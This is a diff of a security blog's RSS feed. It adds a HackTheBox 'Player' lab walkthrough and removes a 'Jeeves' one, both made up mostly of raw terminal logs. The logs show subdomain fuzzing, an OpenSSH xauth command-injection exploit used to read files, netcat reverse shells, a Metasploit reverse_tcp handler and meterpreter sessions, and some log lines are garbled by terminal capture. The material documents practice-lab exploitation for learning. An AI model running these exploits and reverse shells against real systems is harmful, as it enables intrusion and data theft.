             <description>root@kali:~# nmap -sV -sC -Pn 10.10.10.75
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-03 12:23 CEST
 Nmap scan report for 10.10.10.75
@@ -4466,11 +5502,285 @@ b6d##########################88c</p>
         </item>
         
         <item>
-            <title>HackTheBox - Poison</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-poison/</link>
+            <title>HackTheBox - Player</title>
+            <link>/posts/2010/01/hackthebox-player/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-poison/</guid>
+            <guid>/posts/2010/01/hackthebox-player/</guid>
+            <description>~ backupfile
+root@kali:~# nmap -sV -sC 10.10.10.145 [241/1956]
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 22:39 CET
+Nmap scan report for 10.10.10.145
+Host is up (0.032s latency).
+Not shown: 958 closed ports, 40 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
+| 2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
+| 256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
+|_ 256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)</description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<p>~ backupfile</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>root@kali:~# nmap -sV -sC 10.10.10.145 [241/1956]<br>
+Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-18 22:39 CET<br>
+Nmap scan report for 10.10.10.145<br>
+Host is up (0.032s latency).<br>
+Not shown: 958 closed ports, 40 filtered ports<br>
+PORT STATE SERVICE VERSION<br>
+22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)<br>
+| ssh-hostkey:<br>
+| 1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)<br>
+| 2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)<br>
+| 256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)<br>
+|_ 256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)<br>
+80/tcp open http Apache httpd 2.4.7<br>
+|_http-server-header: Apache/2.4.7 (Ubuntu)<br>
+|_http-title: 403 Forbidden<br>
+Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds<br>
+root@kali:~# wfuzz -w /usr/share/wordlists/subdomains-top1mil-5000.txt &ndash;hc 400,403,404 -H &ldquo;HOST: FUZZ.player.htb&rdquo; http://10.10.10.145</p>
+<p>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&rsquo;s documentation for more information.</p>
+<hr>
+<ul>
+<li>Wfuzz 2.4 - The Web Fuzzer *</li>
+</ul>
+<hr>
+<p>Target: http://10.10.10.145/<br>
+Total requests: 5000</p>
+<h1 id="id-response-lines-word-chars-payload">===================================================================<br>
+ID Response Lines Word Chars Payload</h1>
+<p>000000019: 200 86 L 229 W 5243 Ch &ldquo;dev&rdquo;<br>
+000000067: 200 63 L 180 W 1470 Ch &ldquo;staging&rdquo;<br>
+000000070: 200 259 L 714 W 9513 Ch &ldquo;chat&rdquo;</p>
+<p>Total time: 19.66479<br>
+Processed Requests: 5000<br>
+Filtered Requests: 4997<br>
+Requests/sec.: 254.2614</p>
+<p>root@kali:~# vim /etc/hosts</p>
+<h1 id="rootkali-gobuster-dir--w-usrsharewordlistsdirbcommontxt--u-httpplayerhtb">root@kali:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <a href="http://player.htb">http://player.htb</a></h1>
+<h1 id="by-oj-reeves-thecolonial--christian-mehlmauer-_firefart_">Gobuster v3.0.1<br>
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@<em>FireFart</em>)</h1>
+<h1 id="-timeout-10s">[+] Url: <a href="http://player.htb">http://player.htb</a><br>
+[+] Threads: 10<br>
+[+] Wordlist: /usr/share/wordlists/dirb/common.txt<br>
+[+] Status codes: 200,204,301,302,307,401,403<br>
+[+] User Agent: gobuster/3.0.1<br>
+[+] Timeout: 10s</h1>
+<h1 id="20200118-224510-starting-gobuster">2020/01/18 22:45:10 Starting gobuster</h1>
+<h1 id="server-status-status-403">/.hta (Status: 403)<br>
+/.htaccess (Status: 403)<br>
+/.htpasswd (Status: 403)<br>
+/launcher (Status: 301)<br>
+/server-status (Status: 403)</h1>
+<h1 id="20200118-224524-finished">2020/01/18 22:45:24 Finished</h1>
+<p>root@kali:~# cd Downloads/<br>
+root@kali:~/Downloads# python3 gen_avi.py file:///var/www/backup/service_config output.avi<br>
+root@kali:~/Downloads# ls<br>
+8926359.avi gen_avi.py output.avi<br>
+root@kali:~/Downloads# xdg-open 8926359.avi<br>
+root@kali:~/Downloads# clear</p>
+<p>root@kali:~/Downloads# nmap -p- player.htb<br>
+Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-18 23:21 CET<br>
+Stats: 0:12:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>
+SYN Stealth Scan Timing: About 68.28% done; ETC: 23:39 (0:05:41 remaining)<br>
+Stats: 0:25:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>
+SYN Stealth Scan Timing: About 81.64% done; ETC: 23:53 (0:05:47 remaining)<br>
+Stats: 0:38:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>
+SYN Stealth Scan Timing: About 94.34% done; ETC: 00:02 (0:02:19 remaining)<br>
+Nmap scan report for player.htb (10.10.10.145)<br>
+Host is up (0.022s latency).<br>
+Not shown: 65532 closed ports<br>
+PORT STATE SERVICE<br>
+22/tcp open ssh<br>
+80/tcp open http<br>
+6686/tcp open unknown</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 2770.55 seconds<br>
+root@kali:~/Downloads# nmap -p 6686 -sV -sC player.htb<br>
+Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-19 08:50 CET<br>
+Nmap scan report for player.htb (10.10.10.145)<br>
+Host is up (0.019s latency).</p>
+<p>PORT STATE SERVICE VERSION<br>
+6686/tcp open ssh OpenSSH 7.2 (protocol 2.0)</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds<br>
+root@kali:~/Downloads# ssh <a href="mailto:telegen@player.htb">telegen@player.htb</a> -p 6686<br>
+<a href="mailto:telegen@player.htb">telegen@player.htb</a>&rsquo;s password:<br>
+Last login: Sun Jan 19 13:29:59 2020 from 10.10.15.22<br>
+Environment:<br>
+USER=telegen<br>
+LOGNAME=telegen<br>
+HOME=/home/telegen<br>
+PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin<br>
+MAIL=/var/mail/telegen<br>
+SHELL=/usr/bin/lshell<br>
+SSH_CLIENT=10.10.15.22 55464 6686<br>
+SSH_CONNECTION=10.10.15.22 55464 10.10.10.145 6686<br>
+SSH_TTY=/dev/pts/0<br>
+TERM=screen<br>
+========= PlayBuff ==========<br>
+Welcome to Staging Environment</p>
+<p>telegen:~$ ls<br>
+*** forbidden command: ls<br>
+telegen:~$ help<br>
+clear exit help history lpath lsudo<br>
+telegen:~$ lpath<br>
+Allowed:<br>
+/home/telegen<br>
+telegen:~$ lsudo<br>
+Allowed sudo commands:<br>
+telegen:~$ exit<br>
+Connection to player.htb closed.</p>
+<p>root@kali:~/Downloads# searchsploit openssh 7.2</p>
+<hr>
+<p>Exploit Title | Path<br>
+| (/usr/share/exploitdb/)</p>
+<hr>
+<p>OpenSSH 7.2 - Denial of Service | exploits/linux/dos/40888.py<br>
+OpenSSH 7.2p1 - (Authenticated) xauth Command Injection | exploits/multiple/remote/39569.py<br>
+OpenSSH 7.2p2 - Username Enumeration | exploits/linux/remote/40136.py<br>
+OpenSSHd 7.2p2 - Username Enumeration | exploits/linux/remote/40113.txt</p>
+<hr>
+<p>Shellcodes: No Result<br>
+root@kali:~/Downloads# searchsploit -m exploits/multiple/remote/39569.py<br>
+Exploit: OpenSSH 7.2p1 - (Authenticated) xauth Command Injection<br>
+URL: <a href="https://www.exploit-db.com/exploits/39569">https://www.exploit-db.com/exploits/39569</a><br>
+Path: /usr/share/exploitdb/exploits/multiple/remote/39569.py<br>
+File Type: troff or preprocessor input, ASCII text, with very long lines, with CRLF line terminators</p>
+<p>Copied to: /root/Downloads/39569.py</p>
+<p>root@kali:~/Downloads# python 39569.py<br>
+Usage: <!-- raw HTML omitted --> <!-- raw HTML omitted --> <!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+<p>path_to_privkey - path to private key in pem format, or &lsquo;.demoprivkey&rsquo; to use demo private key</p>
+<p>root@kali:~/Downloads# python 39569.py player.htb 6686 telegen &rsquo;d-bC|jC!2uepS/w'<br>
+INFO:<strong>main</strong>:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686<br>
+Traceback (most recent call last):<br>
+File &ldquo;39569.py&rdquo;, line 462, in <!-- raw HTML omitted --><br>
+timeout=10<br>
+File &ldquo;39569.py&rdquo;, line 360, in <strong>init</strong><br>
+look_for_keys=False, pkey=pkey)<br>
+File &ldquo;/usr/lib/python2.7/dist-packages/paramiko/client.py&rdquo;, line 446, in connect<br>
+passphrase,<br>
+File &ldquo;/usr/lib/python2.7/dist-packages/paramiko/client.py&rdquo;, line 764, in _auth<br>
+raise saved_exception<br>
+paramiko.ssh_exception.AuthenticationException: Authentication timeout.<br>
+root@kali:~/Downloads# clear<br>
+root@kali:~/Downloads# python 39569.py player.htb 6686 telegen &rsquo;d-bC|jC!2uepS/w'<br>
+INFO:<strong>main</strong>:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686<br>
+INFO:<strong>main</strong>:connected!<br>
+INFO:<strong>main</strong>:<br>
+Available commands:<br>
+.info<br>
+.readfile <!-- raw HTML omitted --><br>
+.writefile <!-- raw HTML omitted --> <!-- raw HTML omitted --><br>
+.exit .quit<br>
+<!-- raw HTML omitted --></p>
+<p>#&gt; .readfile /home/telegen/user.txt<br>
+DEBUG:<strong>main</strong>:auth_cookie: &lsquo;xxxx\nsource /home/telegen/user.txt\n&rsquo;<br>
+DEBUG:<strong>main</strong>:dummy exec returned: None<br>
+INFO:<strong>main</strong>:30e47abe9e315c0c39462d0cf71c0f48<br>
+#&gt; .readfile /var/www/staging/fix.php</p>
+<p>[..]</p>
+<p>/for<br>
+//fix<br>
+//peter<br>
+//CQXpm\z)G5D#%S$y=<br>
+}<br>
+public<br>
+if($result<br>
+static::passed($test_name);<br>
+}<br>
+static::failed($test_name);<br>
+}<br>
+}<br>
+public<br>
+echo<br>
+echo<br>
+echo<br>
+}<br>
+private<br>
+echo</p>
+<p>[..]</p>
+<p>root@kali:~# ifconfig tun0 [344/344]<br>
+tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500<br>
+inet 10.10.15.95 netmask 255.255.254.0 destination 10.10.15.95<br>
+inet6 dead:beef:2::115d prefixlen 64 scopeid 0x0<!-- raw HTML omitted --><br>
+inet6 fe80::b480:6dc6:a801:c6fa prefixlen 64 scopeid 0x20<!-- raw HTML omitted --><br>
+unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC)<br>
+RX packets 1080 bytes 981503 (958.4 KiB)<br>
+RX errors 0 dropped 0 overruns 0 frame 0<br>
+TX packets 1085 bytes 184916 (180.5 KiB)<br>
+TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p>
+<p>root@kali:~# nc -lnvp 1234<br>
+listening on [any] 1234 &hellip;<br>
+connect to [10.10.15.95] from (UNKNOWN) [10.10.10.145] 58920<br>
+Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux<br>
+03:56:03 up 17 min, 0 users, load average: 0.00, 0.01, 0.01<br>
+USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT<br>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
+/bin/sh: 0: can&rsquo;t access tty; job control turned off<br>
+$ python -c &ldquo;import pty; pty.spawn('/bin/bash')&rdquo;<br>
+www-data@player:/$ ^Z<br>
+[1]+ Stopped nc -lnvp 1234<br>
+root@kali:~# stty raw -echo<br>
+root@kali:~# nc -lnvp 1234</p>
+<p>www-data@player:/$ export TERM=xterm<br>
+www-data@player:/$ clear<br>
+www-data@player:/$ cd /tmp<br>
+www-data@player:/tmp$ nc 10.10.15.95 1337 &gt; pspy64</p>
+<p>root@kali:~# nc -lnvp 1337 &lt; pspy64<br>
+listening on [any] 1337 &hellip;<br>
+connect to [10.10.15.95] from (UNKNOWN) [10.10.10.145] 48964</p>
+<p>www-data@player:/tmp$ chmod +x pspy64<br>
+www-data@player:/tmp$ ./pspy64<br>
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</p>
+<p>██▓███ ██████ ██▓███ ▓██ ██▓<br>
+▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒<br>
+▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░<br>
+▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░<br>
+▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░<br>
+▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒<br>
+░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░<br>
+░░ ░ ░ ░ ░░ ▒ ▒ ░░<br>
+░ ░ ░<br>
+░ ░</p>
+<p>Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)<br>
+Draining file system events due to startup&hellip;<br>
+done</p>
+<p>2020/01/20 04:06:01 CMD: UID=0 PID=3429 | /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d<br>
+2020/01/20 04:06:02 CMD: UID=0 PID=3431 | CRON<br>
+2020/01/20 04:06:02 CMD: UID=0 PID=3433 | /usr/bin/php /var/lib/playbuff/buff.php<br>
+2020/01/20 04:06:02 CMD: UID=0 PID=3432 | /bin/sh -c /usr/bin/php /var/lib/playbuff/buff.php &gt; /var/lib/playbuff/error.log<br>
+2020/01/20 04:06:06 CMD: UID=0 PID=3436 | sleep 5</p>
+<p>www-data@player:/tmp$ cat /var/lib/playbuff/buff.php</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>g.phpata@player:/tmp$ cat /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>www-data@player:/tmp$ clear<br>
+www-w-w-data@player:/tmp$ vimr/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php-data@player:/tmp$ vi /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.pw-data@player:/tmp$ vim /var/www/html/launcher/dee8dc8a47256c64630d803a4c4<br>
+0786g.</p>
+<p>root@kali:~# nc -lnvp 1338<br>
+listening on [any] 1338 &hellip;<br>
+connect to [10.10.15.95] from (UNKNOWN) [10.10.10.145] 34326<br>
+bash: cannot set terminal process group (3781): Inappropriate ioctl for device<br>
+bash: no job control in this shell<br>
+root@player:~# cat /root/root.txt<br>
+cat /root/root.txt<br>
+7df#########ZENSIERT#########49c<br>
+root@player:~#</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HackTheBox - Poison</title>
+            <link>/posts/2010/01/hackthebox-poison/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/hackthebox-poison/</guid>
             <description>root@kali:~# nmap -sC -sV 10.10.10.84 [134/134]
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-14 10:25 CEST
 Nmap scan report for 10.10.10.84
@@ -4628,10 +5938,10 @@ Same machine: preferring raw encoding</p>
         
         <item>
             <title>HackTheBox - Silo</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-silo/</link>
+            <link>/posts/2010/01/hackthebox-silo/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-silo/</guid>
+            <guid>/posts/2010/01/hackthebox-silo/</guid>
             <description>root@kali:~# msfconsole
 msf &amp;gt; use admin/oracle/oracle_login
 msf auxiliary(admin/oracle/oracle_login) &amp;gt; set rhost 10.10.10.82
@@ -4704,10 +6014,10 @@ Microsoft Windows [Version 6.3.9600]<br>
         
         <item>
             <title>HackTheBox - Stratosphere</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-stratosphere/</link>
+            <link>/posts/2010/01/hackthebox-stratosphere/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-stratosphere/</guid>
+            <guid>/posts/2010/01/hackthebox-stratosphere/</guid>
             <description>root@kali:~# searchsploit apache struts
 &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash; &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;$
 Exploit Title | Path
@@ -4862,10 +6172,10 @@ richard@stratosphere:~$ sudo /usr/bin/python /home/richard/test.py</p>
         
         <item>
             <title>HackTheBox Fluxcapacitator</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-fluxcapacitator/</link>
+            <link>/posts/2010/01/hackthebox-fluxcapacitator/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-fluxcapacitator/</guid>
+            <guid>/posts/2010/01/hackthebox-fluxcapacitator/</guid>
             <description>HackTheBox – Fluxcapacitor WriteUp | Tipps + Anleitung | htb Fluxcapacitor ist eine der vielen Verfügbaren CTF Challenges von HackTheBox. Fluxcapacitor ist eine leichte bis mittelschwere Maschine von HackTheBox.
 Tipps [su_spoiler title=&amp;ldquo;Tipp 1&amp;rdquo; open=&amp;ldquo;no&amp;rdquo; style=&amp;ldquo;fancy&amp;rdquo; icon=&amp;ldquo;plus&amp;rdquo; anchor=&amp;quot;&amp;quot; class=&amp;quot;&amp;quot;]
 [/su_spoiler]
@@ -4982,273 +6292,11 @@ bdc 30e</p>
         </item>
         
         <item>
-            <title>HackTheBox Jeeves</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-jeeves/</link>
-            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
-            
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-jeeves/</guid>
-            <description>root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:02 CEST
-Nmap scan report for 10.10.10.63
-Host is up (0.078s latency).
-Not shown: 65531 filtered ports
-PORT STATE SERVICE
-80/tcp open http
-135/tcp open msrpc
-445/tcp open microsoft-ds
-50000/tcp open ibm-db2
-Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds
-root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:10 CEST</description>
-            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
-<p><img src="https://imgur.com/lZBhQ23.jpg" alt="5jenkins"></p>
-<p>root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]<br>
-Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-05-17 19:02 CEST<br>
-Nmap scan report for 10.10.10.63<br>
-Host is up (0.078s latency).<br>
-Not shown: 65531 filtered ports<br>
-PORT STATE SERVICE<br>
-80/tcp open http<br>
-135/tcp open msrpc<br>
-445/tcp open microsoft-ds<br>
-50000/tcp open ibm-db2</p>
-<p>Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds<br>
-root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63<br>
-Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-05-17 19:10 CEST<br>
-Nmap scan report for 10.10.10.63<br>
-Host is up (0.11s latency).</p>
-<p>PORT STATE SERVICE VERSION<br>
-80/tcp filtered http<br>
-135/tcp open msrpc Microsoft Windows RPC<br>
-445/tcp filtered microsoft-ds<br>
-50000/tcp open http Jetty 9.4.z-SNAPSHOT<br>
-|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>
-|_http-title: Error 404 Not Found<br>
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>
-Device type: general purpose<br>
-Running (JUST GUESSING): Microsoft Windows 2008 (89%), FreeBSD 6.X (85%)<br>
-OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:freebsd:freebsd:6.2<br>
-Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), FreeBSD 6.2-RELEASE (85%)<br>
-No exact OS matches for host (test conditions non-ideal).<br>
-Network Distance: 2 hops<br>
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
-<p>TRACEROUTE (using port 135/tcp)<br>
-HOP RTT ADDRESS<br>
-1 65.52 ms 10.10.14.1<br>
-2 273.84 ms 10.10.10.63</p>
-<p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
-Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds</p>
-<p>root@kali:~/htb/jeeves# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -u http://10.10.10.63:50000</p>
-<h1 id="gobuster-v141-oj-reeves-thecolonial">Gobuster v1.4.1 OJ Reeves (@TheColonial)</h1>
-<h1 id="-status-codes--200204301302307">=====================================================<br>
-[+] Mode : dir<br>
-[+] Url/Domain : http://10.10.10.63:50000/<br>
-[+] Threads : 50<br>
-[+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt<br>
-[+] Status codes : 200,204,301,302,307</h1>
-<p>/askjeeves (Status: 302)</p>
-<p><img src="https://imgur.com/SEgHp6t.jpg" alt="1jenkins"></p>
-<p><img src="https://imgur.com/NRLrVP3.jpg" alt="2jenkins"></p>
-<p><img src="https://imgur.com/JFZAihz.jpg" alt="3jenkins"></p>
-<p>msf &gt; use exploit/multi/handler<br>
-msf exploit(multi/handler) &gt; set lhost 10.10.14.206<br>
-lhost =&gt; 10.10.14.206<br>
-msf exploit(multi/handler) &gt; set lport 44544<br>
-lport =&gt; 44544<br>
-msf exploit(multi/handler) &gt; set payload windows/x64/shell/reverse_tcp<br>
-payload =&gt; windows/x64/shell/reverse_tcp<br>
-msf exploit(multi/handler) &gt; clear<br>
-[*] exec: clear</p>
-<p>msf exploit(multi/handler) &gt; exploit</p>
-<p>[<em>] Started reverse TCP handler on 10.10.14.206:44544<br>
-[</em>] Sending stage (336 bytes) to 10.10.10.63<br>
-[*] Command shell session 5 opened (10.10.14.206:44544 -&gt; 10.10.10.63:49694) at 2018-05-17 20:21:01 +0200</p>
-<p>Microsoft Windows [Version 10.0.10586]<br>
-(c) 2015 Microsoft Corporation. All rights reserved.</p>
-<p>C:\Users\Administrator.jenkins&gt;More?<br>
-More?</p>
-<p>&lsquo;PuGroj&rsquo; is not recognized as an internal or external command,<br>
-operable program or batch file.</p>
-<p>C:\Users\Administrator.jenkins&gt;^Z<br>
-Background session 5? [y/N] y<br>
-msf exploit(multi/handler) &gt; sessions -u 5<br>
-[*] Executing &lsquo;post/multi/manage/shell_to_meterpreter&rsquo; on session(s): [5]</p>
-<p>[<em>] Upgrading session ID: 5<br>
-[</em>] Starting exploit/multi/handler<br>
-[<em>] Started reverse TCP handler on 10.10.14.206:4433<br>
-#&lt;Thread:0x000056306eca6008@/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run&gt; terminated with exception (report_on_exception is true):<br>
-Traceback (most recent call last):<br>
-1: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb💯in <code>block in spawn'   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:268:in </code>block in cleanup_handler': uninitialized constant Msf::Modules::Mod706f73742f6d756c74692f6d616e6167652f7368656c6c5f746f5f<br>
-6d65746572707265746572::MetasploitModule::HANDLE_TIMEOUT (NameError)<br>
-msf exploit(multi/handler) &gt;<br>
-[</em>] Sending stage (179779 bytes) to 10.10.10.63<br>
-[<em>] Meterpreter session 6 opened (10.10.14.206:4433 -&gt; 10.10.10.63:49695) at 2018-05-17 20:21:31 +0200<br>
-Interrupt: use the &lsquo;exit&rsquo; command to quit<br>
-msf exploit(multi/handler) &gt; sessions -i 6<br>
-[</em>] Starting interaction with 6&hellip;</p>
-<p>meterpreter &gt; getuid<br>
-Server username: JEEVES\kohsuke</p>
-<h1 id="listing-cuserskohsuke">meterpreter &gt; cd C:/Users/kohsuke<br>
-meterpreter &gt; ls<br>
-Listing: C:\Users\kohsuke</h1>
-<p>Mode Size Type Last modified Name</p>
-<hr>
-<p>40777/rwxrwxrwx 0 dir 2017-11-04 03:51:45 +0100 .groovy<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 AppData<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Application Data<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Contacts<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Cookies<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:19:59 +0100 Desktop<br>
-40555/r-xr-xr-x 4096 dir 2017-11-04 04:18:57 +0100 Documents<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Downloads<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Favorites<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 Links<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Local Settings<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Music<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Documents<br>
-100666/rw-rw-rw- 786432 fil 2017-12-24 20:38:40 +0100 NTUSER.DAT<br>
-100666/rw-rw-rw- 65536 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TM.blf<br>
-100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000001.regtrans-ms<br>
-100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000002.regtrans-ms<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 NetHood<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 OneDrive<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 08:10:02 +0100 Pictures<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 PrintHood<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Recent<br>
